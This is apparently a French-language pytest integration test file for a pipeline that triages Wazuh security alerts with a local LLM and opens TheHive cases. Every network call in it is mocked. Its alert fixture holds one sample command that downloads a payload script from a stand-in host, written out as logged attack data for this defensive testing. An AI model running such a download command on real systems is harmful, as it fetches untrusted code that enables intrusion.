"""Tests d'integration du pipeline wazuh_ai_triage.py avec Wazuh, Ollama et TheHive
mockes (unittest.mock, aucun appel reseau reel). Objectif : verifier l'enchainement
complet fetch -> triage LLM -> creation de cas -> idempotence, y compris les chemins
d'erreur (LLM en panne, reponse hors-schema, cas TheHive deja existant), qui ne sont
pas couverts par les tests unitaires purs de test_wazuh_ai_triage.py."""
import os
import sys
from unittest.mock import MagicMock, patch

import pytest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "scripts"))

os.environ.setdefault("WAZUH_INDEXER_PASSWORD", "test-password-not-real")
os.environ.setdefault("THEHIVE_API_KEY", "test-key-not-real")

import wazuh_ai_triage as wat  # noqa: E402


def _mock_response(json_body, status_code=200):
    resp = MagicMock()
    resp.status_code = status_code
    resp.json.return_value = json_body
    resp.raise_for_status.side_effect = None
    return resp


def _wazuh_hit(alert_id, level=10, description="Test rule"):
    return {
        "_id": alert_id,
        "_source": {
            "rule": {"id": "100099", "level": level, "description": description},
            "agent": {"name": "soc-lab"},
            "timestamp": "2026-07-18T18:00:00.000Z",
            "full_log": "curl -o /tmp/payload.sh http://example.invalid/payload.sh",
        },
    }


class TestFetchRecentAlerts:
    def test_fetch_recent_alerts_preserves_es_id(self):
        hits = {"hits": {"hits": [_wazuh_hit("es-id-1"), _wazuh_hit("es-id-2")]}}
        with patch("wazuh_ai_triage.requests.get", return_value=_mock_response(hits)) as mock_get:
            alerts = wat.fetch_recent_alerts(min_level=8)
        assert [a["_es_id"] for a in alerts] == ["es-id-1", "es-id-2"]
        assert mock_get.call_args.kwargs["json"]["query"]["bool"]["filter"][1] == {
            "range": {"rule.level": {"gte": 8}}
        }


class TestTriageWithLlm:
    def test_valid_llm_response_returns_triage_result(self):
        payload = {
            "incident_type": "Recuperation d'outil externe",
            "criticite": "haute",
            "mitre_tactic": "Command and Control",
            "mitre_technique": "T1105",
            "resume": "curl recupere un script depuis un hote externe.",
            "recommandation": "Isoler l'hote et analyser le script.",
        }
        ollama_body = {"response": __import__("json").dumps(payload)}
        with patch("wazuh_ai_triage.requests.post", return_value=_mock_response(ollama_body)):
            result = wat.triage_with_llm(_wazuh_hit("es-id-1")["_source"])
        assert result is not None
        assert result.mitre_technique == "T1105"
        assert result.criticite == "haute"

    def test_malformed_json_response_returns_none(self):
        ollama_body = {"response": "ceci n'est pas du JSON valide"}
        with patch("wazuh_ai_triage.requests.post", return_value=_mock_response(ollama_body)):
            result = wat.triage_with_llm(_wazuh_hit("es-id-1")["_source"])
        assert result is None

    def test_schema_invalid_response_returns_none(self):
        # mitre_technique absent du schema attendu
        payload = {"incident_type": "x", "criticite": "haute", "mitre_tactic": "y", "resume": "z", "recommandation": "w"}
        ollama_body = {"response": __import__("json").dumps(payload)}
        with patch("wazuh_ai_triage.requests.post", return_value=_mock_response(ollama_body)):
            result = wat.triage_with_llm(_wazuh_hit("es-id-1")["_source"])
        assert result is None

    def test_ollama_unreachable_returns_none_without_raising(self):
        import requests as real_requests
        with patch("wazuh_ai_triage.requests.post", side_effect=real_requests.ConnectionError("connection refused")), \
             patch("wazuh_ai_triage.time.sleep"):
            result = wat.triage_with_llm(_wazuh_hit("es-id-1")["_source"])
        assert result is None


class TestCreateTheHiveCase:
    def _triage(self):
        return wat.TriageResult(
            incident_type="Recuperation d'outil externe",
            criticite="haute",
            mitre_tactic="Command and Control",
            mitre_technique="T1105",
            resume="resume test",
            recommandation="recommandation test",
        )

    def test_creates_case_when_none_exists(self):
        alert = _wazuh_hit("es-id-1")["_source"]
        alert["_es_id"] = "es-id-1"
        search_resp = _mock_response([])  # find_existing_case_by_source_ref -> aucun resultat
        create_resp = _mock_response({"_id": "case-new"})
        with patch("wazuh_ai_triage.requests.post", side_effect=[search_resp, create_resp]) as mock_post:
            result = wat.create_thehive_case(alert, self._triage(), "haute")
        assert result == {"case_id": "case-new", "created": True}
        assert mock_post.call_count == 2

    def test_returns_existing_case_without_duplicate_when_source_ref_already_used(self):
        """Simule le scenario du crash entre create_thehive_case() et mark_processed() :
        TheHive a deja un cas pour ce sourceRef, donc aucun second cas ne doit etre cree."""
        alert = _wazuh_hit("es-id-1")["_source"]
        alert["_es_id"] = "es-id-1"
        search_resp = _mock_response([{"_id": "case-existing"}])
        with patch("wazuh_ai_triage.requests.post", return_value=search_resp) as mock_post:
            result = wat.create_thehive_case(alert, self._triage(), "haute")
        assert result == {"case_id": "case-existing", "created": False}
        assert mock_post.call_count == 1  # uniquement la recherche, pas de POST de creation

    def test_search_failure_raises_fail_closed_instead_of_risking_duplicate(self):
        """Si la verification par sourceRef echoue (TheHive injoignable), on ne doit PAS
        creer de cas en supposant silencieusement qu'aucun n'existe -- c'est exactement le
        scenario que cette verification est censee prevenir. TheHiveVerificationError doit
        remonter et aucun POST de creation ne doit partir."""
        alert = _wazuh_hit("es-id-1")["_source"]
        alert["_es_id"] = "es-id-1"
        import requests as real_requests
        with patch("wazuh_ai_triage.requests.post", side_effect=real_requests.ConnectionError("down")), \
             patch("wazuh_ai_triage.time.sleep"), \
             pytest.raises(wat.TheHiveVerificationError):
            wat.create_thehive_case(alert, self._triage(), "haute")


class TestSourceRefTag:
    """build_source_ref_tag() -- convention d'idempotence pour TheHive 5.2.16-1
    (pas de champ Case.sourceRef sur cette version, voir
    docs/evidence/final/PFA-FINAL-20260718-214637/thehive52/API_COMPATIBILITY_FINDINGS.md)."""

    def test_same_alert_id_produces_same_tag(self):
        assert wat.build_source_ref_tag("es-id-1") == wat.build_source_ref_tag("es-id-1")

    def test_different_alert_ids_produce_different_tags(self):
        assert wat.build_source_ref_tag("es-id-1") != wat.build_source_ref_tag("es-id-2")

    def test_tag_format_is_sha256_hex_digest(self):
        tag = wat.build_source_ref_tag("es-id-1")
        assert tag.startswith("source-ref-sha256:")
        digest = tag.removeprefix("source-ref-sha256:")
        assert len(digest) == 64
        int(digest, 16)  # leve ValueError si ce n'est pas de l'hexadecimal

    def test_empty_alert_id_is_rejected(self):
        with pytest.raises(ValueError):
            wat.build_source_ref_tag("")


class TestFindExistingCaseByTag:
    def test_query_endpoint_and_filter_shape(self):
        search_resp = _mock_response([])
        with patch("wazuh_ai_triage.requests.post", return_value=search_resp) as mock_post:
            result = wat.find_existing_case_by_tag("source-ref-sha256:abc")
        assert result is None
        call = mock_post.call_args
        assert call.args[0].endswith("/api/v1/query")
        assert call.kwargs["json"]["query"] == [
            {"_name": "listCase"},
            {"_name": "filter", "_field": "tags", "_value": "source-ref-sha256:abc"},
        ]

    def test_existing_result_returns_case_id(self):
        search_resp = _mock_response([{"_id": "case-existing-tag"}])
        with patch("wazuh_ai_triage.requests.post", return_value=search_resp):
            result = wat.find_existing_case_by_tag("source-ref-sha256:abc")
        assert result == "case-existing-tag"

    def test_empty_result_returns_none(self):
        search_resp = _mock_response([])
        with patch("wazuh_ai_triage.requests.post", return_value=search_resp):
            result = wat.find_existing_case_by_tag("source-ref-sha256:abc")
        assert result is None

    def test_timeout_raises_verification_error(self):
        import requests as real_requests
        with patch("wazuh_ai_triage.requests.post", side_effect=real_requests.Timeout("timed out")), \
             patch("wazuh_ai_triage.time.sleep"), \
             pytest.raises(wat.TheHiveVerificationError):
            wat.find_existing_case_by_tag("source-ref-sha256:abc")

    def test_http_error_raises_verification_error(self):
        import requests as real_requests
        error_resp = MagicMock()
        error_resp.status_code = 500
        error_resp.raise_for_status.side_effect = real_requests.HTTPError("500")
        with patch("wazuh_ai_triage.requests.post", return_value=error_resp), \
             patch("wazuh_ai_triage.time.sleep"), \
             pytest.raises(wat.TheHiveVerificationError):
            wat.find_existing_case_by_tag("source-ref-sha256:abc")

    def test_unexpected_response_shape_raises_verification_error(self):
        """Reponse 200 mais pas une liste (ex : objet d'erreur inattendu) -- ne doit
        jamais etre interprete silencieusement comme 'aucun cas existant'."""
        malformed_resp = _mock_response({"type": "SomeUnexpectedShape"})
        with patch("wazuh_ai_triage.requests.post", return_value=malformed_resp), \
             pytest.raises(wat.TheHiveVerificationError):
            wat.find_existing_case_by_tag("source-ref-sha256:abc")


class TestDedupModeDispatch:
    def test_source_ref_mode_calls_source_ref_search(self, monkeypatch):
        monkeypatch.setattr(wat, "THEHIVE_DEDUP_MODE", "source_ref")
        with patch("wazuh_ai_triage.find_existing_case_by_source_ref", return_value="case-x") as m_sr, \
             patch("wazuh_ai_triage.find_existing_case_by_tag") as m_tag:
            result = wat.find_existing_case("es-id-1")
        assert result == "case-x"
        m_sr.assert_called_once_with("es-id-1")
        m_tag.assert_not_called()

    def test_tag_mode_calls_tag_search_with_deterministic_tag(self, monkeypatch):
        monkeypatch.setattr(wat, "THEHIVE_DEDUP_MODE", "tag")
        with patch("wazuh_ai_triage.find_existing_case_by_tag", return_value="case-y") as m_tag, \
             patch("wazuh_ai_triage.find_existing_case_by_source_ref") as m_sr:
            result = wat.find_existing_case("es-id-1")
        assert result == "case-y"
        m_tag.assert_called_once_with(wat.build_source_ref_tag("es-id-1"))
        m_sr.assert_not_called()

    def test_invalid_dedup_mode_is_rejected_by_validate_configuration(self, monkeypatch):
        monkeypatch.setattr(wat, "THEHIVE_DEDUP_MODE", "not-a-real-mode")
        with pytest.raises(SystemExit):
            wat.validate_configuration()


class TestCreateTheHiveCaseTagMode:
    def _triage(self):
        return wat.TriageResult(
            incident_type="Recuperation d'outil externe",
            criticite="haute",
            mitre_tactic="Command and Control",
            mitre_technique="T1105",
            resume="resume test",
            recommandation="recommandation test",
        )

    def test_creates_case_without_source_ref_field_and_with_tag(self, monkeypatch):
        monkeypatch.setattr(wat, "THEHIVE_DEDUP_MODE", "tag")
        alert = _wazuh_hit("es-id-tag-1")["_source"]
        alert["_es_id"] = "es-id-tag-1"
        search_resp = _mock_response([])
        create_resp = _mock_response({"_id": "case-tag-new"})
        with patch("wazuh_ai_triage.requests.post", side_effect=[search_resp, create_resp]) as mock_post:
            result = wat.create_thehive_case(alert, self._triage(), "haute")
        assert result == {"case_id": "case-tag-new", "created": True}
        create_call = mock_post.call_args_list[1]
        payload = create_call.kwargs["json"]
        assert "sourceRef" not in payload
        assert wat.build_source_ref_tag("es-id-tag-1") in payload["tags"]
        assert "es-id-tag-1" in payload["description"]

    def test_reuses_existing_case_found_by_tag_no_second_post(self, monkeypatch):
        monkeypatch.setattr(wat, "THEHIVE_DEDUP_MODE", "tag")
        alert = _wazuh_hit("es-id-tag-2")["_source"]
        alert["_es_id"] = "es-id-tag-2"
        search_resp = _mock_response([{"_id": "case-tag-existing"}])
        with patch("wazuh_ai_triage.requests.post", return_value=search_resp) as mock_post:
            result = wat.create_thehive_case(alert, self._triage(), "haute")
        assert result == {"case_id": "case-tag-existing", "created": False}
        assert mock_post.call_count == 1

    def test_headers_include_organisation_and_never_log_authorization(self, monkeypatch, caplog):
        monkeypatch.setattr(wat, "THEHIVE_DEDUP_MODE", "tag")
        alert = _wazuh_hit("es-id-tag-3")["_source"]
        alert["_es_id"] = "es-id-tag-3"
        search_resp = _mock_response([])
        create_resp = _mock_response({"_id": "case-tag-3"})
        with patch("wazuh_ai_triage.requests.post", side_effect=[search_resp, create_resp]) as mock_post:
            wat.create_thehive_case(alert, self._triage(), "haute")
        for call in mock_post.call_args_list:
            headers = call.kwargs["headers"]
            assert headers["X-Organisation"] == wat.THEHIVE_ORGANISATION
            assert headers["Content-Type"] == "application/json"
        assert wat.THEHIVE_API_KEY not in caplog.text


class TestFullPipelineWithSqliteState:
    def test_end_to_end_alert_to_case_marks_state_as_case_created(self, monkeypatch, tmp_path):
        db_path = str(tmp_path / "state.sqlite3")
        monkeypatch.setattr(wat, "STATE_DB_PATH", db_path)
        conn = wat.init_state_db()

        alert = _wazuh_hit("es-id-full")["_source"]
        alert["_es_id"] = "es-id-full"
        assert wat.already_processed(conn, "es-id-full") is False

        payload = {
            "incident_type": "Recuperation d'outil externe",
            "criticite": "haute",
            "mitre_tactic": "Command and Control",
            "mitre_technique": "T1105",
            "resume": "r",
            "recommandation": "r",
        }
        ollama_resp = _mock_response({"response": __import__("json").dumps(payload)})
        search_resp = _mock_response([])
        create_resp = _mock_response({"_id": "case-e2e"})

        with patch("wazuh_ai_triage.requests.post", side_effect=[ollama_resp, search_resp, create_resp]):
            triage = wat.triage_with_llm(alert)
            assert triage is not None
            result = wat.create_thehive_case(alert, triage, "haute")
            assert result["created"] is True
            wat.mark_processed(conn, "es-id-full", result["case_id"], status="case_created")

        assert wat.already_processed(conn, "es-id-full") is True
        row = conn.execute("SELECT status, case_id FROM processed_alerts WHERE alert_id = ?", ("es-id-full",)).fetchone()
        assert row == ("case_created", "case-e2e")
        conn.close()

    def test_tag_mode_reruns_with_empty_state_db_reuse_case_no_duplicate(self, monkeypatch, tmp_path):
        """Simule la perte de l'etat SQLite local (nouvelle base vide) pour la MEME alerte,
        en mode THEHIVE_DEDUP_MODE=tag : la recherche cote TheHive doit retrouver le cas deja
        cree et retourner created=False, sans creer de second cas -- preuve que la
        deduplication cote TheHive fonctionne independamment de l'etat local."""
        monkeypatch.setattr(wat, "THEHIVE_DEDUP_MODE", "tag")
        alert = _wazuh_hit("es-id-rerun")["_source"]
        alert["_es_id"] = "es-id-rerun"
        triage = wat.TriageResult(
            incident_type="Recuperation d'outil externe", criticite="haute",
            mitre_tactic="Command and Control", mitre_technique="T1105",
            resume="r", recommandation="r",
        )

        # Run 1 : base SQLite vide, aucun cas existant cote TheHive -> creation.
        db_path_1 = str(tmp_path / "state_run1.sqlite3")
        monkeypatch.setattr(wat, "STATE_DB_PATH", db_path_1)
        conn1 = wat.init_state_db()
        search_resp_1 = _mock_response([])
        create_resp_1 = _mock_response({"_id": "case-rerun-1"})
        with patch("wazuh_ai_triage.requests.post", side_effect=[search_resp_1, create_resp_1]):
            result1 = wat.create_thehive_case(alert, triage, "haute")
        assert result1 == {"case_id": "case-rerun-1", "created": True}
        wat.mark_processed(conn1, "es-id-rerun", result1["case_id"], status="case_created")
        conn1.close()

        # Run 2 : NOUVELLE base SQLite vide (etat local "perdu"), mais TheHive retrouve
        # le cas via le tag deterministe -> reutilisation, pas de second POST de creation.
        db_path_2 = str(tmp_path / "state_run2_empty.sqlite3")
        monkeypatch.setattr(wat, "STATE_DB_PATH", db_path_2)
        conn2 = wat.init_state_db()
        assert wat.already_processed(conn2, "es-id-rerun") is False  # etat local bien reparti a zero
        search_resp_2 = _mock_response([{"_id": "case-rerun-1"}])
        with patch("wazuh_ai_triage.requests.post", return_value=search_resp_2) as mock_post_2:
            result2 = wat.create_thehive_case(alert, triage, "haute")
        assert result2 == {"case_id": "case-rerun-1", "created": False}
        assert mock_post_2.call_count == 1  # uniquement la recherche par tag, aucune creation
        conn2.close()

    def test_end_to_end_llm_failure_leaves_alert_retryable(self, monkeypatch, tmp_path):
        db_path = str(tmp_path / "state.sqlite3")
        monkeypatch.setattr(wat, "STATE_DB_PATH", db_path)
        conn = wat.init_state_db()

        alert = _wazuh_hit("es-id-fail")["_source"]
        alert["_es_id"] = "es-id-fail"

        import requests as real_requests
        with patch("wazuh_ai_triage.requests.post", side_effect=real_requests.ConnectionError("boom")), \
             patch("wazuh_ai_triage.time.sleep"):
            triage = wat.triage_with_llm(alert)
        assert triage is None
        wat.mark_processed(conn, "es-id-fail", None, status="failed_retryable")

        # L'alerte doit rester eligible a une nouvelle tentative, pas "traitee" definitivement.
        assert wat.already_processed(conn, "es-id-fail") is False
        conn.close()
